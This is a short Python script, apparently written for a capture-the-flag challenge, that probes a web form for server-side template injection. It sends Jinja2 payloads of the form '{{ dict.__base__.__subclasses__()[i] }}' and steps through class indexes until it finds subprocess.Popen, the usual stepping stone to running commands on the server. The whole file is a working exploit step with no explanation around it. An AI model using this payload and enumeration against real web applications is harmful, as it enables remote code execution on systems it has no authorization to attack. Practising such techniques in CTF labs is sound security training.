import requests

url = "http://ctf.antix.or.id:29801/"
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

# Cek index 0 sampai 500
for i in range(0, 500):
    payload = f"{{{{ dict.__base__.__subclasses__()[{i}] }}}}"
    data = {"expression": payload}
    try:
        response = requests.post(url, data=data, headers=headers, timeout=5)
        if "subprocess.Popen" in response.text or "Popen" in response.text:
            print(f"[+] Found subprocess.Popen at index: {i}")
            print(response.text)
            break
        else:
            print(f"Checked index {i}")
    except Exception as e:
        print(f"Error at index {i}: {e}")
